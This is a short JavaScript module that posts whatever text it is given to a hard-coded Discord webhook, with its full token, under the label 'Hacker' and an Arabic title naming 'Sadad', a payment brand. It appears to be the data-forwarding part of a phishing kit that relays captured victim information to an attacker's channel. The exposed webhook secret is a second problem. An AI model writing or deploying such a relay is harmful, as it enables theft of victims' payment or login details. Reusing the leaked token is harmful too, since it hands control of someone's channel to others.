import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321451370641100862/lIpxXRinO07ghfP2_li8pD1e0kSgbZ1ePvOVR_XH2mdMvMfvFMrpL2LQgs6-_S31aCeL",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
